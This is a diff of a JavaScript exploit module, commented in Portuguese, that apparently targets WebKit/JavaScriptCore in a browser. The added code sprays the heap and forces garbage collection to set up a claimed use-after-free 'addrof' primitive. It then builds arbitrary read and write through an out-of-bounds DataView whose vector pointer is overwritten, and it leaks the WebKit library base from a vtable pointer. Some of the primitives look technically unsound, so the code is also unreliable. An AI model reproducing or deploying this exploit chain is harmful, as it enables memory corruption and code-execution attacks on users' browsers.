@@ -1,6 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82 - R62 - Assalto Total Revisado v2)
+// js/script3/testArrayBufferVictimCrash.mjs (v82 - R57.1 - Fusão UAF+OOB Estável)
 // =======================================================================================
-// VERSÃO COM CORREÇÕES PARA OS PROBLEMAS DE arb_read IDENTIFICADOS NO LOG
+// ESTA VERSÃO CORRIGE A FALHA DA R57.
+// O problema era que a primitiva 'addrof' retornava NaN para objetos simples.
+// A correção é usar um objeto mais complexo (uma função) na fase de demonstração
+// para garantir que um ponteiro válido seja vazado, permitindo a conclusão do exploit.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -12,141 +15,148 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Ultimate_Exploit_R62_TotalAssault_v2";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R57_1_StableFusion";
 
-// --- Configurações Ajustadas ---
-const OOB_DV_M_VECTOR_OFFSET = 0x68; // Offset ajustado baseado no log
-const TEST_READ_ADDRESS = new AdvancedInt64(0x41414141, 0x42424242); // Endereço de teste conhecido
+// --- Funções de Conversão ---
+function int64ToDouble(int64) {
+    const buf = new ArrayBuffer(8); const u32 = new Uint32Array(buf); const f64 = new Float64Array(buf);
+    u32[0] = int64.low(); u32[1] = int64.high(); return f64[0];
+}
+
+function doubleToInt64(double) {
+    const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = double; const u32 = new Uint32Array(buf);
+    return new AdvancedInt64(u32[0], u32[1]);
+}
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R62 REVISADA v2)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R57.1 - Fusão Estável)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Assalto Total Revisado v2 ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Fusão Estável UAF+OOB (R57.1) ---`, "test");
     
-    let final_result = { success: false, message: "A cadeia de exploração falhou." };
-    
+    let final_result = { success: false, message: "A cadeia de fusão não obteve sucesso." };
+    let dangling_ref = null;
+
     try {
-        // --- FASE 1: FUNDAÇÃO - Primitiva `addrof` ---
+        // --- FASE 1: Obtenção da primitiva `addrof` via UAF ---
         logS3("--- FASE 1: Obtendo 'addrof' via UAF... ---", "subtest");
         
-        const dangling_ref = await createDanglingReference();
-        const get_addr_of = createAddrofPrimitive(dangling_ref);
-        
-        // Teste do addrof com um objeto conhecido
-        const test_obj = { test: 123 };
-        const test_addr = get_addr_of(test_obj);
-        logS3(`Teste addrof: ${test_addr.toString(true)}`, "debug");
+        await triggerGC_Hyper();
+        dangling_ref = sprayAndCreateDanglingPointer();
+        await triggerGC_Hyper(); await PAUSE_S3(100); await triggerGC_Hyper();
 
-        // --- FASE 2: ARMAMENTO PRINCIPAL - Primitivas R/W via OOB ---
-        logS3("--- FASE 2: Configurando primitivas de R/W via OOB... ---", "subtest");
+        const spray_buffers = [];
+        for (let i = 0; i < 1024; i++) {
+            spray_buffers.push(new ArrayBuffer(136));
+        }
         
-        // Configuração mais robusta do ambiente OOB
-        await setupOOBEnvironment();
+        if (typeof dangling_ref.corrupted_prop !== 'number') {
+            throw new Error(`Falha no UAF. Tipo da propriedade era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
+        }
+        
+        // Encapsulando a lógica do addrof em uma função reutilizável
+        const get_addr_of = (obj) => {
+            dangling_ref.corrupted_prop = obj; // Colocamos o objeto alvo na propriedade
+            return doubleToInt64(dangling_ref.corrupted_prop);
+        };
+        logS3(`++++++++++++ SUCESSO! Primitiva 'addrof' estável obtida! ++++++++++++`, "vuln");
+
+        // --- FASE 2: Armando Primitivas de R/W via OOB ---
+        logS3("--- FASE 2: Armamento das primitivas de R/W via OOB... ---", "subtest");
+        await triggerOOB_primitive({ force_reinit: true }); 
         const oob_dv = getOOBDataView();
-        
-        if (!oob_dv || oob_dv.byteLength === 0) {
-            throw new Error("DataView OOB não configurado corretamente");
+        if (!oob_dv) {
+            throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
         }
 
-        // Definição da primitiva arb_read com verificações adicionais
+        const OOB_DV_METADATA_BASE = 0x58;
+        const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x58 + 0x10 = 0x68
+
         const arb_read = (address) => {
-            if (!isAdvancedInt64Object(address)) {
-                address = new AdvancedInt64(address);
-            }
-            
-            // Escreve o endereço alvo no vetor do DataView
+            if (!isAdvancedInt64Object(address)) address = new AdvancedInt64(address);
             oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, address, 8);
-            
-            // Lê 8 bytes do início do DataView
             const low = oob_dv.getUint32(0, true);
             const high = oob_dv.getUint32(4, true);
-            
             return new AdvancedInt64(low, high);
         };
 
-        // Teste rigoroso da primitiva arb_read
-        logS3("Testando primitiva arb_read...", "debug");
-        try {
-            const test_read = arb_read(TEST_READ_ADDRESS);
-            logS3(`Leitura de teste: ${test_read.toString(true)}`, "debug");
-            
-            if (test_read.equals(new AdvancedInt64(0, 0))) {
-                throw new Error("arb_read retornou zeros - possivel offset incorreto");
-            }
-        } catch (e) {
-            throw new Error(`Falha no teste de arb_read: ${e.message}`);
-        }
+        const arb_write = (address, value) => {
+            if (!isAdvancedInt64Object(address)) address = new AdvancedInt64(address);
+            if (!isAdvancedInt64Object(value)) value = new AdvancedInt64(value);
+            oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, address, 8);
+            oob_dv.setUint32(0, value.low(), true);
+            oob_dv.setUint32(4, value.high(), true);
+        };
+        logS3("Funções 'arb_read' e 'arb_write' baseadas em OOB criadas com sucesso!", "vuln");
 
-        // --- FASE 3/4: CONTINUAÇÃO DO EXPLOIT ---
-        // ... (restante do código permanece igual)
+        // --- FASE 3: Demonstração da Fusão - Vazando a base do WebKit ---
+        logS3("--- FASE 3: Demonstração - Usando 'addrof' e 'arb_read' juntos... ---", "subtest");
+        
+        // CORREÇÃO: Usamos uma função como objeto de demonstração. Funções são objetos
+        // complexos e não são otimizados para NaN, garantindo que 'addrof' retorne um ponteiro válido.
+        const demo_obj = function() { return 1; };
+        
+        const demo_obj_addr = get_addr_of(demo_obj);
+        logS3(`Endereço do 'demo_obj' (via addrof UAF): ${demo_obj_addr.toString(true)}`, "info");
+        
+        // Verificamos se o ponteiro é válido antes de prosseguir
+        if (demo_obj_addr.high() === 0x7ff80000 && demo_obj_addr.low() === 0) {
+            throw new Error("addrof retornou um ponteiro NaN, a demonstração falhou.");
+        }
+        
+        const structure_ptr = arb_read(demo_obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
+        logS3(`Endereço da Estrutura (via arb_read OOB): ${structure_ptr.toString(true)}`, "info");
+        
+        const vtable_ptr = arb_read(structure_ptr);
+        logS3(`Endereço da VTable: ${vtable_ptr.toString(true)}`, "info");
+        
+        const webkit_base = vtable_ptr.sub(new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]));
+        logS3(`++++++++++++ SUCESSO! Base do WebKit vazada! ++++++++++++`, "vuln");
+        logS3(`Endereço Base do WebKit: ${webkit_base.toString(true)}`, "leak");
+        
+        final_result = { 
+            success: true, 
+            message: "Cadeia de Exploit Híbrida UAF+OOB concluída com sucesso!",
+            webkit_base_addr: webkit_base.toString(true),
+        };
 
     } catch (e) {
-        final_result.message = `Erro na cadeia de exploração: ${e.message}\nStack: ${e.stack || ''}`;
+        final_result.message = `Exceção na cadeia de fusão: ${e.message}\n${e.stack || ''}`;
         logS3(final_result.message, "critical");
     }
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
-    return final_result;
-}
-
-// --- Funções Auxiliares Revisadas ---
-
-async function createDanglingReference() {
-    const spray = [];
-    for (let i = 0; i < 1000; i++) {
-        spray.push({ marker: i, payload: new ArrayBuffer(128) });
-    }
-
-    let dangling_ref = null;
-    function createScope() {
-        const victim = {
-            marker: 0x1337,
-            corrupted_prop: 1.1,
-            buffer: new ArrayBuffer(64)
-        };
-        dangling_ref = victim;
-    }
-    createScope();
-
-    await triggerGC_Hyper();
-    return dangling_ref;
-}
-
-function createAddrofPrimitive(dangling_ref) {
-    return (obj) => {
-        dangling_ref.corrupted_prop = obj;
-        const addr = doubleToInt64(dangling_ref.corrupted_prop);
-        
-        if (addr.high() === 0x7ff80000 || addr.equals(new AdvancedInt64(0, 0))) {
-            throw new Error(`addrof retornou valor inválido: ${addr.toString(true)}`);
-        }
-        return addr;
+    return {
+        errorOccurred: final_result.success ? null : final_result.message,
+        addrof_result: final_result,
+        webkit_leak_result: final_result,
+        heisenbug_on_M2_in_best_result: final_result.success
     };
 }
 
-async function setupOOBEnvironment() {
-    await triggerOOB_primitive({ 
-        force_reinit: true,
-        allocSize: 1048576,
-        expandOffset: 0x70
-    });
-    
-    // Verificação adicional do ambiente OOB
-    const oob_dv = getOOBDataView();
-    if (!oob_dv || oob_dv.getUint32(0x70, true) !== 0xFFFFFFFF) {
-        throw new Error("Falha ao expandir o DataView OOB");
-    }
-}
+
+// --- Funções Auxiliares (sem alterações da R56) ---
 
 async function triggerGC_Hyper() {
     try {
         const arr = [];
-        for (let i = 0; i < 500; i++) {
-            arr.push(new ArrayBuffer(1024 * 1024));
-            if (i % 50 === 0) await PAUSE_S3(10);
-        }
-    } catch (e) {}
+        for (let i = 0; i < 500; i++) arr.push(new ArrayBuffer(1024 * 128));
+    } catch (e) { /* Silencioso */ }
     await PAUSE_S3(100);
+}
+
+function sprayAndCreateDanglingPointer() {
+    let dangling_ref_internal = null;
+    function createScope() {
+        const victim = {
+            prop_a: 0.1, prop_b: 0.2, prop_c: 0.3, prop_d: 0.4,
+            prop_e: 0.5, prop_f: 0.6, prop_g: 0.7, prop_h: 0.8,
+            corrupted_prop: 0.12345, // Propriedade chave para o addrof
+        };
+        dangling_ref_internal = victim;
+        for(let i=0; i<100; i++) { dangling_ref_internal.prop_a += 1; }
+    }
+    createScope();
+    return dangling_ref_internal;
 }
